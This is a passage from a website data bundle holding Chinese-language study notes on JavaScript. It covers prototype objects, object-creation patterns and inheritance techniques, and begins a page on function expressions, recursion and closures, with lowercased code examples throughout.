person();\nperson1.sayname();          // "s"\nvar person2 = new person();\nperson2.sayname();          // "s"\nconsole.log(person1.sayname == person2.sayname); // true\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n# 2.3.1 理解原型对象\n\n函数的prototype属性指向原型对象，而原型对象有个constructor属性，这个属性是指向 原型对象所在函数 的，也就是说person.prototype.constructor是指向person的；原型对象也会有其他常见属性和方法，这是从object继承而来的；然后剩下的就是在代码中自己添加的属性和方法了。\n\n使用原型模式创建出来的实例，该实例有个内部属性[[prototype]]，该内部属性是指向 对应构造函数的原型对象 的，不是指向构造函数的，这点要区分开来。构造函数的prototype和实例的[[prototype]]都指向原型对象的。\n\n可以使用isprototypeof()来确定当前原型对象是否被目标实例内部属性[[prototype]]指引着，例：\n\nconsole.log(person.prototype.isprototypeof(person1));   // true，person1的内部属性[[prototype]]是指向person.prototype的\nconsole.log(person.prototype.isprototypeof(person2));   // true，person2的内部属性[[prototype]]是指向person.prototype的\n\n\n1\n2\n\n\necmascript5新增的object.getprototypeof()方法可以获得 实例内部属性[[prototype]]指向的原型对象，例：\n\nconsole.log(object.getprototypeof(person1) == person.prototype);   // true，person1的内部属性[[prototype]]是指向person.prototype的\nconsole.log(object.getprototypeof(person1).name);   // "s"，原型对象上name属性\n\n\n1\n2\n\n\n读取对象某个属性的过程：会先从 对象实例本身 开始搜索，如果在实例中搜索到该属性就会返回该属性的值，如果没有找到会去实例对应的 原型对象 上搜索，搜索到该属性会返回该属性的值。\n\n虽然可以通过对象实例访问保存在原型中的值，但却 不能通过对象实例重写原型中的值；当然，如果在对象实例上添加了一个与原型对象里 同名 的属性，那实例上的这个属性会 屏蔽 原型对象上的同名属性（因为读取属性的过程就是实例属性优先）。 可以屏蔽但不能修改。\n\nhasownproperty()方法可以检测一个 属性是存在于实例对象中，存在于实例中会返回true，否则返回false（存在原型中或原型里也不存在）。例如上面使用delete后，person1里的name属性是属于原型对象的，这时使用hasownproperty()会返回false，person1.hasownproperty("name"); // false。\n\nfunction person() {}\nperson.prototype.name = "s";\nperson.prototype.age = 35;\nperson.prototype.job = "doctor";\nperson.prototype.sayname = function() {\n    console.log(this.name);\n}\nvar person1 = new person();\nvar person2 = new person();\nperson1.name = "l";\nconsole.log(person1.name);      // "l"，屏蔽了\nconsole.log(person2.name);      // "s"\n\ndelete person1.name;            // 解除屏蔽\nconsole.log(person1.name);      // "s"\nperson1.hasownproperty("name"); // false，实例上没有name属性了\nobject.getprototypeof(person1).name = "ss"; // error，不能通过对象实例重写原型中的值\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n# 2.3.2 原型与in操作符\n\n单独使用in操作符：判断属性是否存在于对象中，判断不了该属性是存在于 实例 中还是 原型 中。\n\nfunction hasprototypeproperty(object, name) {\n    return !object.hasownproperty(name) && (name in object); // return结果为true时，name在原型对象中\n}\n\n\n1\n2\n3\n\n\n在for-in循环中使用：遍历对象的可枚举属性，不管它存在于 实例 中还是 原型 中。\n\nfunction person(name, age, job) {\n    this.name = name;\n    this.age = age;\n    this.job = job;\n}\nperson.prototype.sayname = function() {\n    console.log(this.name);\n}\nvar person = new person("s", 35, "doctor");\n\nfor (var prop in person) {\n    if (person.hasownproperty(prop)) {\n        console.log("prop1", prop);      // "name"、"age"、"job"，过滤掉了原型上的属性"sayname"\n    }\n    console.log("prop2", prop);      // "name"、"age"、"job"、"sayname"，不管它是实例中的还是原型中\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\necmascript5新增的object.keys()方法会返回 可枚举的实例属性（不会返回该对象的原型上的属性）；上面的例子里的for-in可以替换为：\n\nvar keys = object.keys(person);\nkeys.foreach(function(prop) {\n    console.log(prop);          // "name"、"age"、"job"，keys是个数组\n});\n\n\n1\n2\n3\n4\n\n\n不止object.keys()可替代for-in，object.getownpropertynames()也可以，只是它是返回所有 实例属性，不管是否可枚举。\n\n// 可用在某个原型对象上，那就返回该原型对象的“实例属性”，不会返回该原型对象的原型上的属性；一定要区分“实例属性”和“原型上的属性”\nvar keys = object.getownpropertynames(person.prototype);\nkeys.foreach(function(prop) {\n    console.log(prop);          // "consctrutor"、"sayname"，"consctrutor"是不可枚举的\n});\n\n\n1\n2\n3\n4\n5\n\n\n# 2.3.3 更简单的原型语法\n\n使用字面量的方式优化在原型上添加属性，但是要注意，使用字面量形式相当于重写了prototype，那么其constructor会被覆盖，这里得重新赋值constructor；但又会引入一个新问题，重新赋值的constructor其[[enumerable]]特性变为了true，也就可枚举的了，原生的constructor属性是不可枚举的。\n\nfunction person() {}\nperson.prototype = {\n    constructor: person,    // 重新赋值，但是[[enumerable]]特性变为了true\n    name: "s",\n    age: 35,\n    job: "doctor",\n    sayname: function() {\n        console.log(this.name);\n    }\n};\nobject.defineproperty(person.prototype, "constructor", {\n    enumerable: false,\n    value: person\n})\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n# 2.3.4 原型的动态性\n\n之前我们通过实例的[[prototype]]（也就是object.getprototypeof(person)）是修改不了原型里的值，现在可以通过person.prototype.xxx来修改原型里的值，并且能立即从实例上反映出这个修改。\n\n修改没问题，但重写person.prototype得注意一下：如果实例化在先，重写person.prototype在后，实例对象的[[prototype]]指向的原型对象是没有变的，它没有指向重写后的person.prototype，还是指向着老原型对象。\n\nfunction person() {}\n\nvar friend = new person();  // 先实例化\n\nperson.prototype = {        // 后重写person.prototype\n    constructor: person,\n    name: "s",\n    age: 35,\n    job: "doctor",\n    sayname: function() {\n        console.log(this.name);\n    }\n};\nfriend.sayname(); // error，只是将新对象赋给了person.prototype，并没有一并赋给对象的[[prototype]]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n解决办法当然是将重写person.prototype这步骤放在 实例化之前 了。\n\n# 2.3.5 原生对象的原型\n\n原生的引用类型 创建时也采用了 原型模式，可在原型上找到一些方法：array.prototype.sort()、string.prototype.substring()。可以在原型上新添方法，不过不推荐新添或修改方法。\n\n# 2.3.6 原型对象的问题\n\n原型模式 省略了为构造函数传递初始化参数这一环节，而会在原型上直接赋予属性的值，所有的实例也是 共享 了原型上的属性，一旦原型上的值发生改变（一般不会变，除了引用类型属性），就会立即同步到所有实例上。\n\n这样的共享对于一些 固定值 的属性来说还是有帮助的，比如 方法复用 和 常量式的属性；而对一些 经常变化 的值来说，就非常不友好，因为无法重写原型上的属性的值，只能借助一些特殊的手段： - 原型里的基本类型属性：可以通过实例.属性名的方式给某个实例对象添加对应的同名属性，这样就可以 屏蔽 原型上的同名属性了； - 原型里的引用类型属性：也可以使用屏蔽的方式，也可以直接 调用引用类型属性的方法 或者 修改引用类型属性的属性，但会有个问题，效果会立即同步到其他实例上，因为原型上的属性都是被所有实例共享的。\n\nfunction person() {}\nperson.prototype = {\n    constructor: person,\n    name: "s",\n    age: 35,\n    job: "doctor",\n    friends: ["shelby", "court"],\n    sayname: function() {\n        console.log(this.name);\n    }\n};\nvar person1 = new person();\nvar person2 = new person();\n// 使用“实例.属性名”重新赋值的时候，其实是在实例上新增属性，这样就屏蔽了原型上的同名属性\nperson1.name = "l";\nconsole.log(person1.name);      // "l"，虽然是共享同一个name，但上一步在person1上新建了一个name属性\nconsole.log(person2.name);      // "s"，共享同一个name，还是原型上的name，person2里是没有name属性的\n// “实例.属性名”可以屏蔽原型上的同名属性，这里是调用了原型上的引用类型属性的方法，效果会立即同步到其他实例上\nperson1.friends.push("van");\nconsole.log(person1.friends);   // ["shelby", "court", "van"]，效果同步了；如果是person1.friends = xxx;就可以屏蔽了\nconsole.log(person2.friends);   // ["shelby", "court", "van"]，效果同步了\nconsole.log(person1.friends === person2.friends); // true，共享同一个引用类型\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n\n# 2.4 组合使用构造函数模式和原型模式\n\n在原型与in操作符里讲“实例属性”和“原型上的属性”举过里例子，在构造函数里定义一些属性（独享），在原型里也定义一些属性（共享），这是组合使用 构造函数模式 和 原型模式 的一种混成模式。\n\nfunction person(name, age, job) {\n    this.name = name;\n    this.age = age;\n    this.job = job;\n    this.friends = ["w", "q"];\n}\nperson.prototype = {\n    constructor: person,\n    sayname: function() {\n        console.log(this.name);\n    }\n};\nvar person1 = new person("l", 22, "student");\nvar person2 = new person("s", 35, "doctor");\nperson1.friends.push("t");\nconsole.log(person1.friends);                       // ["w", "q", "t"]\nconsole.log(person2.friends);                       // ["w", "q"]\nconsole.log(person1.friends === person2.friends);   // false，独享的\nconsole.log(person1.sayname === person2.sayname);   // true，共享的\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 2.5 动态原型模式\n\n动态原型模式 是对“组合使用 构造函数模式 和 原型模式 ”的优化，通过检查某个应该存在的方法是否有效来决定是否需要将其 添加到原型中去。\n\nfunction person(name, age, job) {\n    this.name = name;\n    this.age = age;\n    this.job = job;\n    if (typeof this.sayname != "function") {\n        person.prototype.sayname = function() {\n            console.log(this.name);\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n这种方式可谓非常完美，但要注意的是 添加到原型 并不是重写原型，因为在调用构造函数时相当于先实例一个对象，具体原因可以查看原型的动态性。\n\n\n# 2.6 寄生构造函数模式\n\n寄生构造函数模式 其实是一个 工厂模式，只是把定义函数和使用函数的方式改为了 构造函数模式 的方式。这个模式的作用，为一个类型添加额外的方法。能使用其他模式的情况下最好不要使用这个模式，因为在构造函数内部或者外部创建对象都一样，而在内部创建只是为了添加额外新方法，对这个对象使用instanceof检测出来的结果跟构造函数本身没有关系。\n\nfunction specialarray() {\n    var values = new array();\n    values.push.apply(values, arguments);\n    values.topipedstring = function() { // 为array额外添加的方法\n        return this.join("|");\n    }\n    return values;\n}\nvar colors = new specialarray("red", "blue", "green");\nconsole.log(colors.topipedstring());    // "red|blue|green"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 2.7 稳妥构造函数模式\n\n通过 稳妥构造函数模式 创建的对象是 稳妥对象，这种稳妥对象没有 公共属性 而且其方法也不引用 this的对象。适合在一些安全的环境中或者防止数据给其他应用程序改动，因为在构造函数里没有使用this，也没有将初始入参绑到对象上（只给你使用，但不能修改原始值），那么在外部也不能访问到构造函数中的原始数据。\n\nfunction person(name, age, job) {\n    var o = new object();\n    o.sayname = function() {            // 为object额外添加的方法\n        console.log(name)               // 没有使用this\n    }\n    return o;\n}\nvar person = person("l", 22, "student");// 没有使用new\nperson.sayname();                       // "l"\nconsole.log(person.name);               // undefined，外部也不能访问到构造函数中的原始数据\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 三、继承\n\n一般有两种类型的继承：接口继承 和 实现继承。接口继承只继承 方法签名，而实现继承是继承了 实际的方法。ecmascript里函数没有签名，只支持实现继承，且主要依靠 原型链 来实现的。\n\n\n# 3.1 原型链\n\necmascript中的继承，是利用原型让一个引用类型继承另一个引用类型的属性和方法。让引用类型a的 实例 作为引用类型b的 原型对象，那么引用类型b的 原型对象 上就有了 [[prototype]]指针 并指向引用类型a的 原型对象，而引用类型a的原型对象里有个constructor属性就是指向 引用类型 a的。这样链式结构也就是所谓的 原型链，引用类型b可以使用引用类型a的属性和方法（b继承了a）。\n\nfunction a() {\n    this.property = true;\n}\na.prototype.getvaluea = function() {\n    return this.property;\n}\nfunction b() {\n    this.subproperty = false;\n}\nb.prototype = new a();                  // 引用类型a的实例作为引用类型b的原型对象，b继承了a\nb.prototype.getvalueb = function() {    // b除了继承了a的属性和方法，还给自己新添加了方法\n    return this.subproperty;\n}\nvar instance = new b();\nconsole.log(instance.getvaluea());      // true，b继承了a，所以可以访问a的方法\nconsole.log(instance.constructor === a);// true，b原型等于了a的实例，b原型的constructor不再是b了，会去a里查找\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n有个需要注意的地方，instance.constructor现在指向了引用类型a。这是因为引用类型b的原型指向了引用类型a的原型，而引用类型a的原型的constructor是指向引用类型a的。\n\n# 3.1.1 默认的原型\n\n所有引用类型都继承了object，这个继承也是通过原型链实现的，那么所有引用类型的默认原型都是object的实例，因此默认原型会指向object的原型。这也是自定义类型都会继承tostring()、valueof()等默认方法的根本原因。\n\n# 3.1.2 确定原型和实例的关系\n\n一种是使用instanceof操作符：\n\nconsole.log(instance instanceof object);    // true\nconsole.log(instance instanceof a);         // true\nconsole.log(instance instanceof b);         // true\n\n\n1\n2\n3\n\n\n另一种使用isprototypeof()方法：\n\nconsole.log(object.prototype.isprototypeof(instance));    // true\nconsole.log(a.prototype.isprototypeof(instance));         // true\nconsole.log(b.prototype.isprototypeof(instance));         // true\n\n\n1\n2\n3\n\n\n# 3.1.3 谨慎地定义方法\n\n子类在原型上添加新方法或者重写父类的方法时，语句一定要在“继承语句”之后，下面这个例子就是“(2)(3)”必须得在“(1)”之后。\n\nfunction a() {\n    this.property = true;\n}\na.prototype.getvaluea = function() {\n    return this.property;\n}\nfunction b() {\n    this.subproperty = false;\n}\nb.prototype = new a();                  // (1)继承语句，b继承了a\nb.prototype.getvalueb = function() {    // (2)b给自己新添加了方法\n    return this.subproperty;\n}\nb.prototype.getvaluea = function() {    // (3)重写了a里存在的方法\n    return false;\n}\nvar instance = new b();\nconsole.log(instance.getvaluea());      // false\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n通过原型链实现继承时，不能在“继承语句”之后再使用字面量重写原型，这样会打乱原型链而构不成继承关系了，例：\n\nfunction a() {\n    this.property = true;\n}\na.prototype.getvaluea = function() {\n    return this.property;\n}\nfunction b() {\n    this.subproperty = false;\n}\nb.prototype = new a();           // b继承了a\nb.prototype = {                  // 使用字面量添加新方法，会导致上一行代码无效\n    getvalueb: function() {\n        return this.subproperty;\n    },\n    someothermethod: function() {\n        return false;\n    },\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# 3.1.4 原型链的问题\n\n在“创建对象”的原型模式里有说过原型对象的问题。\n\n在继承里，原型链模式也有同样的问题。因为让 父类的实例 当作了 子类的原型对象，那么子类的所有实例 共享 父类的那个实例里的 所有属性，不管是父类的“实例属性”还是“原型上的属性”。\n\n原型链模式还有一个问题：没有办法在不影响所有对象实例的情况下，给父类的构造函数中传递参数。\n\n正因为上述两个问题，在实践中 很少单独使用原型链模式。\n\n\n# 3.2 借用构造函数\n\n借用构造函数，在子类的构造函数里调用父类的构造函数。在子类的实例里会执行父类的构造函数，那么子类的实例可以 独享 父类的实例属性。\n\nfunction a() {\n    this.colors = ["red", "blue", "green"];\n}\nfunction b() {\n    a.call(this);               // 使用apply也可以，并且也可以传递参数，比如给colors传值\n}\nvar instance1 = new b();\ninstance1.colors.push("black");\nconsole.log(instance1.colors);  // ["red", "blue", "green", "black"]\nvar instance2 = new b();\nconsole.log(instance2.colors);  // ["red", "blue", "green"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n借用构造函数的方式可以解决原型链模式里“不能向父类的构造函数中传递参数”的问题，但跟“创建对象”里的“构造函数模式”有同样的问题，就是 函数无法复用，每次调用构造函数都会重复创建了一次函数。\n\n\n# 3.3 组合继承\n\n组合继承，就是将 原型链模式 和 借用构造函数模式 组合到一块，使用原型链实现对 原型属性和方法的继承，通过借用构造函数来实现对 实例属性的继承。\n\nfunction a(name) {\n    this.name = name;\n    this.colors = ["red", "blue", "green"];\n}\na.prototype.sayname = function() {  // 方法写在原型上，达到复用方法的目的\n    console.log(this.name);\n}\nfunction b(name, age) {\n    a.call(this, name);             // 第二次调用构造函数，“借用构造函数模式”，来继承父类的实例属性\n    this.age = age;\n}\nb.prototype = new a();              // 第一次调用构造函数，“原型链模式”，继承父类的实例属性和原型上的属性\nb.prototype.constructor = b;\nb.prototype.sayage = function() {   // 方法写在原型上，达到复用方法的目的\n    console.log(this.age);\n}\n\nvar instance1 = new b("l", 22);\ninstance1.colors.push("black");\nconsole.log(instance1.colors);      // ["red", "blue", "green", "black"]\ninstance1.sayname();                // "l"\ninstance1.sayage();                 // 22\nvar instance2 = new b("s", 35);\nconsole.log(instance2.colors);      // ["red", "blue", "green"]\ninstance2.sayname();                // "s"\ninstance2.sayage();                 // 35\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n这样避免了 原型链模式 和 借用构造函数模式 的缺陷，又融合了它们的优点，是比较常用的一种继承模式。而且instanceof和isprototypeof()也能用于识别基于组合继承创建的对象。\n其实 组合继承 也有缺点：无论什么情况下都会 调用两次父类的构造函数；在第一次调用父类的构造函数，子类的原型上得到了父类的 实例属性和原型上的属性，在第二次调用父类的构造函数，子类的实例会得到父类的 实例属性，这样实例属性既存在于实例上也存在于原型上，会显得很冗余。\n\n\n# 3.4 原型式继承\n\n原型链模式 其实也是用了构造函数的写法。如果不使用构造函数而使用普通函数，并且在普通函数内部定义一个 临时引用类型 的构造函数，再让普通函数的 入参对象 作为这个临时引用类型的 原型，最后返回这个临时引用类型的 实例，那么这个实例是继承了函数入参对象的属性和方法，这种继承方式叫做 原型式继承。\n\nfunction object(o) {\n    function f() {}     // 定义临时引用类型f的构造函数\n    f.prototype = o;    // 普通函数的入参对象o作为这个临时引用类型f的原型\n    return new f();     // 最后临时引用类型f的实例\n}\n\nvar person = {\n    name: "nicholas",\n    friends: ["shelby", "court", "van"]\n};\nvar anotherperson = object(person);\nanotherperson.name = "greg";            // 使用“实例.属性名”重新赋值的时候，其实是在实例上新增属性，这样就屏蔽了原型上的同名属性\nanotherperson.friends.push("rob");      // 这不是屏蔽（屏蔽是用“=”），而是调用了原型上的引用类型属性的方法，效果会立即同步到其他实例上\nvar yetanotherperson = object(person);\nyetanotherperson.name = "linda";        // 使用“实例.属性名”重新赋值的时候，其实是在实例上新增属性，这样就屏蔽了原型上的同名属性\nyetanotherperson.friends.push("barbie");// 这不是屏蔽（屏蔽是用“=”），而是调用了原型上的引用类型属性的方法，效果会立即同步到其他实例上\n\nconsole.log(person.friends);            //  ["shelby", "court", "van", "rob", "barbie"]，之前的操作效果同步了（因为共享）\nconsole.log(person.name);               // "nicholas"\nconsole.log(anotherperson.name);        // "greg"，虽说也是共享，但之前使用“实例.属性名”重新赋值的手段屏蔽了原型上的同名属性\nconsole.log(yetanotherperson.name);     // "linda"，虽说也是共享，但之前使用“实例.属性名”重新赋值的手段屏蔽了原型上的同名属性\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\necmascript5通过新增object.create()方法规范化了原型式继承，该方法接收两个参数：作为新对象原型的对象、位新对象定义额外属性的对象。\n\nvar person = {\n    name: "nicholas",\n    friends: ["shelby", "court", "van"]\n};\nvar anotherperson = object.create(person); // 生成了一个对象，这个对象的原型指向了person\nanotherperson.name = "greg";            // 使用“实例.属性名”重新赋值的时候，其实是在实例上新增属性，这样就屏蔽了原型上的同名属性\nanotherperson.friends.push("rob");      // 这不是屏蔽（屏蔽是用“=”），而是调用了原型上的引用类型属性的方法，效果会立即同步到其他实例上\nvar yetanotherperson = object.create(person, {\n    name: {\n        value: "linda"                  // 屏蔽了原型上的同名属性\n    }\n});\nyetanotherperson.friends.push("barbie");\n\nconsole.log(person.friends);            //  ["shelby", "court", "van", "rob", "barbie"]，之前的操作效果同步了（因为共享）\nconsole.log(person.name);               // "nicholas"\nconsole.log(anotherperson.name);        // "greg"，虽说也是共享，但之前使用“实例.属性名”重新赋值的手段屏蔽了原型上的同名属性\nconsole.log(yetanotherperson.name);     // "linda"，虽说也是共享，但之前了原型上的同名属性\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n没必要兴师动众地创建构造函数，而只想让一个对象 浅复制 另一个对象，可以使用 原型式继承。但它与 原型链模式 的缺点一样，原型上的属性会被一直共享，特别是引用类型的属性。\n\n浅复制，之前在2.变量、作用域和内存问题#复制变量值里提到过，复制对象的属性值，如果属性是引用类型，只会复制地址值，堆里的对象还是同一个（对象不会被复制）。\n\n\n# 3.5 寄生式继承\n\n寄生式继承 和 寄生构造函数模式 有些类似。使用了 工厂模式 并在里面调用了一个生成新对象的函数（例如上节的object()），让一个对象复制另一个对象，然后给这个新对象添加自己的实例方法，最后返回这个新对象。\n\nfunction createanother(original) {\n    var clone = object(original);   // 调用一个创建新对象的函数，不一定就是上节的object()，也可以是object.create()\n    clone.sayhi = function() {      // 额外给新对象添加方法\n        console.log("hi");\n    }\n    return clone;                   // 返回这个新对象\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n寄生式继承 里额外添加方法是做不到函数 复用 的。\n\n\n# 3.6 寄生组合式继承\n\n在组合继承那节说过它的缺点，继承到属性比较 冗余（原型和实例有同样的属性）。然后 寄生组合式继承 可以解决这个问题。\n寄生组合式继承：不必为了指定子类的原型而调用父类的 构造函数，直接让子类的原型使用 寄生式继承（原型式继承也可以） 来继承父类的 原型，其他的同 组合继承。\n\nfunction a(name) {\n    this.name = name;\n    this.colors = ["red", "blue", "green"];\n}\na.prototype.sayname = function() {          // 方法写在原型上，达到复用方法的目的\n    console.log(this.name);\n}\nfunction b(name, age) {\n    a.call(this, name);                     // “借用构造函数”，来继承实例属性\n    this.age = age;\n}\nb.prototype = object.create(a.prototype);   // “寄生式继承”或“原型式继承”，来继承原型上的属性\nb.prototype.constructor = b;\nb.prototype.sayage = function() {           // 方法写在原型上，达到复用方法的目的\n    console.log(this.age);\n}\n\nvar instance1 = new b("l", 22);\ninstance1.colors.push("black");\nconsole.log(instance1.colors);              // ["red", "blue", "green", "black"]\ninstance1.sayname();                        // "l"\ninstance1.sayage();                         // 22\nvar instance2 = new b("s", 35);\nconsole.log(instance2.colors);              // ["red", "blue", "green"]\ninstance2.sayname();                        // "s"\ninstance2.sayage();                         // 35\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n',charsets:{cjk:!0}},{title:"5.函数表达式",frontmatter:{title:"5.函数表达式"},regularPath:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0JavaScript/5.%E5%87%BD%E6%95%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F.html",relativePath:"book-web/html、css、js、ts/学习JavaScript/5.函数表达式.md",key:"v-0d9f8f99",path:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0JavaScript/5.%E5%87%BD%E6%95%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F.html",headers:[{level:2,title:"一、函数的特征",slug:"一、函数的特征",normalizedTitle:"一、函数的特征",charIndex:12},{level:2,title:"二、递归",slug:"二、递归",normalizedTitle:"二、递归",charIndex:1731},{level:2,title:"三、闭包",slug:"三、闭包",normalizedTitle:"三、闭包",charIndex:2555},{level:3,title:"3.1 闭包与变量",slug:"_3-1-闭包与变量",normalizedTitle:"3.1 闭包与变量",charIndex:4432},{level:3,title:"3.2 闭包与this对象",slug:"_3-2-闭包与this对象",normalizedTitle:"3.2 闭包与this对象",charIndex:5240},{level:3,title:"3.3 内存泄漏",slug:"_3-3-内存泄漏",normalizedTitle:"3.3 内存泄漏",charIndex:5670},{level:2,title:"四、模仿块级作用域",slug:"四、模仿块级作用域",normalizedTitle:"四、模仿块级作用域",charIndex:5828},{level:2,title:"五、私有变量",slug:"五、私有变量",normalizedTitle:"五、私有变量",charIndex:6147}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"一、函数的特征 二、递归 三、闭包 3.1 闭包与变量 3.2 闭包与this对象 3.3 内存泄漏 四、模仿块级作用域 五、私有变量",content:'# 函数表达式\n\n\n# 一、函数的特征\n\n在3.引用类型#Function类型里介绍过定义函数的三种方式：函数声明、函数表达式、构造函数。\n\n其中 函数声明 有个重要的特征就是 函数声明提升，意思是在执行代码之前会 先读取函数声明。这就意味着可以把函数声明放在调用它的语句的 后面。\n\nfoo();                  // 输出数值3，因为(1)和(3)会“函数声明提升”，并且最后(3)会覆盖(1)\nfunction foo() {        // (1) 函数声明提升\n    console.log(1);\n}\nvar foo = function() {  // (2) 变量声明提升，但是函数声明提升会优先。并且还是同名，那就不会进行变量声明提升了\n    console.log(2);\n};\nfunction foo() {        // (3) 函数声明提升\n    console.log(3);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n函数表达式 ，看起来像是常规的变量赋值语句，即创建一个函数并将它赋值给变量。这种情况下创建的函数叫 匿名函数（拉姆达函数），因为function关键字后面没有标识符。理解 函数声明提升 就要要区分函数声明和函数表达式之间的区别，例：\n\nsayHi(); // 错误：函数还不存在\nvar sayHi = function() {\n    console.log("Hi!");\n}\n\n/*********也不要这样做****************/\nif (condition) {\n    function sayHi() {\n        console.log("Hi!");\n    }\n} else {\n    function sayHi() {\n        console.log("Yo!");\n    }\n}\n/*********可以这样做******************/\nvar sayHi;\nif (condition) {\n    sayHi = function() {\n        console.log("Hi!");\n    }\n} else {\n    sayHi = function() {\n        console.log("Yo!");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n在3.引用类型#作为值的函数里提过函数 作为值来使用，比如作为函数的返回值：\n\nfunction comparisonFunction(propertyName) {\n    return function (object1, object2) {    // 作为了comparisonFunction的返回值来使用\n        var v1 = object1[propertyName];\n        var v2 = object2[propertyName];\n        if (v1 < v2) {\n            return -1;\n        } else if (v1 > v2) {\n            return 1;\n        } else {\n            return 0;\n        }\n    };\n}\nvar values = [ { age: 3 }, { age: 10 }, { age: 15 }, { age: 1 }, { age: 5 } ];\nvalues.sort(comparisonFunction("age"));\nconsole.log(values); // [ { age: 1 }, { age: 3 }, { age: 5 }, { age: 10 }, { age: 15 } ]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# 二、递归\n\n一个函数通过名字调用自身，这样的结构是 递归函数。\n\n// 经典的递归阶乘函数\nfunction factorial(num) {\n    if (num <= 1) {\n        return 1;\n    } else {\n        return num * factorial(num - 1);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n这个函数表面看起来没什么问题，但下面的代码可能导致它出错：\n\nvar anotherFactorial = factorial;\nfactorial = null;                   // anotherFactorial还指引着原函数，而factorial引进断开了\nconsole.log(anotherFactorial(4));   // 出错，到factorial(num - 1);时发现factorial已经不存在了\n\n\n1\n2\n3\n\n\narguments.callee是一个指向正在执行的函数的指针，可以使用来它来解决这个问题：\n\nfunction factorial(num) {\n    if (num <= 1) {\n        return 1;\n    } else {\n        return num * arguments.callee(num - 1);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n严格模式下不能使用arguments.callee，可以使用命名函数表达式来达成相同的结果：\n\nvar factorial = (function f(num) {\n    if (num <= 1) {\n        return 1;\n    } else {\n        return num * f(num - 1);\n    }\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 三、闭包\n\n在“变量、作用域和内存问题”里介绍过执行环境及作用域，可以简单回顾一下函数的创建以及调用。\n\n * 在某个环境（全局或某个函数内部）中执行时，假如遇到了“创建函数”的语句。创建 这个新函数时，会复制环境里的 作用域链 并保存到新函数的[[Scope]]属性中。\n * 当这个函数被 调用 时，会初始化内部的环境（变量对象、作用域链、this）。用 this 绑定函数调用处的上下文对象；初始化函数内部的变量保存到 变量对象 中；复制函数的[[Scope]]属性作为函数内部的 作用域链，并将变量对象相关的指针也保存在这个作用域链上。\n\n其实 闭包 这个结构存在于上面的过程中了，创建函数时 函数本身和它所处的环境 构成了一个闭包结构，这个闭包涵盖了 嵌套外层函数的环境 和 全局环境 里所有的 变量对象 以及它们的指针也就是 作用域链。\n\nvar a = 1;                  // (1)\nfunction foo() {            // (2)\n    var b = 2;              // (3)\n    function bar() {        // (4)\n        console.log(a);     // (5)，可以访问全局变量a，输出1\n        console.log(b);     // (6)，可以访问嵌套外层变量b，输出2\n        console.log(c);     // (7)，可以访问嵌套外层变量c，输出3\n    }                       // (8)\n    var c = 3;              // (9)\n    bar();                  // (10)\n}                           // (11)\nfoo();                      // (12)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n分析一下上面这个例子，bar函数在创建时，bar与bar所处的环境（foo的内部环境和foo外部的全局环境）一起构成了一个 闭包 结构。在(10)调用bar函数，在(5)(6)(7)里可以访问a b c三个变量。但严格地说，这三个变量不是通过闭包访问的，其实是单纯地通过 作用域链 访问的，这个作用域链其实也是闭包的一部分。这样不好观察闭包，下面这个例子可以很清晰地观察闭包。\n\nvar a = 1;                  // (1)\nfunction foo() {            // (2)\n    var b = 2;              // (3)\n    function bar() {        // (4)\n        console.log(a);     // (5)，可以访问全局变量a，输出1\n        console.log(b);     // (6)，可以访问嵌套外层变量b，输出2\n        console.log(c);     // (7)，可以访问嵌套外层变量b，输出2\n    }                       // (8)\n    var c = 3;              // (9)\n    return bar;             // 